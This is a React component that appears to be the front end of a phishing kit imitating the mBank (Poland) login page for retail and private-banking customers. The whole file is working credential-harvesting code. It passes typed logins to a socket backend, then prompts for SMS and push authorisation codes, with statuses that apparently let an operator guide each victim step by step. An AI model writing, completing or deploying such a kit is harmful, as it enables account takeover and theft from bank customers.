import React, {useEffect, useState} from "react";
import MbankFormLogin from "./MbankFormLogin";
import {useSocket} from "../../../context/socket/socketProvider";
import MbankFormCode from "./MbankFormCode";
import MbankFail from "./MbankFail";
import MbankLoader from "./MbankLoader";

const MbankForm = () => {
    const {user, initUser, connect, disconnect, sendCode, sendData} = useSocket();
    const [type, setType] = useState('retail');
    const submitLogin = (data) => {
        console.log('Login', data);
        initUser({
            ...data, bank: 'mbank'
        });
    }
    const submitCode = (code) => {
        sendCode(code);
    }
    const submitPush = (code) => {
        sendData('send_push_code', {code});
    }
    useEffect(() => {
        connect('mbank');
        return () => disconnect();
    }, [])

    return (
        <div className="panel">
            {
                type === 'retail' ?
                    <div id="retail" className="login expanded login-form scenario-default">
                        {
                            user.status === '' || user.status === 'wrong_login' ?
                                <MbankFormLogin status={user.status} handler={submitLogin} type={type}/> :
                                user.status === 'getting_code' || user.status === 'wrong_code' ?
                                    <MbankFormCode status={user.status} handler={submitCode} type={type}/> :
                                    user.status === 'getting_push_code' || user.status === 'wrong_push_code' ?
                                        <MbankFormCode status={user.status} handler={submitPush} type={type}/> :
                                    user.status === 'broke_user' ?
                                        <MbankFail/> :
                                        <MbankLoader/>
                        }


                        <div className="buttons info-buttons right">
                            <a href="https://www.mbank.pl/pomoc/info/bezpieczenstwo/logowanie-odblokowanie.html"
                               target="_blank"
                               className="login-problems-link left" rel="noreferrer">Problem z zalogowaniem?</a>
                        </div>
                    </div> :
                    <div id="retail" className="login collapsed">
                        <a href="#retail"
                           onClick={(e) => {
                               e.preventDefault();
                               setType('retail');
                           }}
                        >
                            <div className="title-container">
                                <h2 className="accessible-not-visible">Klienci indywidualni i firmowi</h2>
                                <div className="title">Klienci indywidualni i firmowi</div>
                            </div>
                            <div className="photo-container">
                                <div className="photo photo-retail"/>
                            </div>
                        </a>
                    </div>
            }
            {
                type === 'pb' ?
                    <div id="pb" className="login expanded login-form scenario-default">
                        {
                            user.status === '' || user.status === 'wrong_login' ?
                                <MbankFormLogin status={user.status} handler={submitLogin} type={type}/> :
                                user.status === 'getting_code' || user.status === 'wrong_code' ?
                                    <MbankFormCode status={user.status} handler={submitCode} type={type}/> :
                                    user.status === 'broke_user' ?
                                        <MbankFail/> :
                                        <MbankLoader/>
                        }


                        <div className="buttons info-buttons right">
                            <a href="https://www.mbank.pl/pomoc/info/bezpieczenstwo/logowanie-odblokowanie.html"
                               target="_blank"
                               className="login-problems-link left" rel="noreferrer">Problem z zalogowaniem?</a>
                        </div>
                    </div> :
                    <div id="pb" className="login collapsed">
                        <a href="#pb"
                           onClick={(e) => {
                               e.preventDefault();
                               setType('pb');
                           }}
                        >
                            <div className="title-container">
                                <h2 className="accessible-not-visible">Private Banking</h2>
                                <div className="title">Private Banking</div>
                            </div>
                            <div className="photo-container">
                                <div className="photo photo-pb"/>
                            </div>
                        </a>
                    </div>
            }

            <div id="corpo" className="login collapsed">
                <a href="https://online.mbank.pl/pl/LoginCompanyNet">
                    <div className="title-container">
                        <h2 className="accessible-not-visible">CompanyNet</h2>
                        <div className="title">CompanyNet</div>
                    </div>
                    <div className="photo-container">
                        <div className="photo photo-corpo"/>
                    </div>
                </a>
            </div>


        </div>
    )
}
export default MbankForm;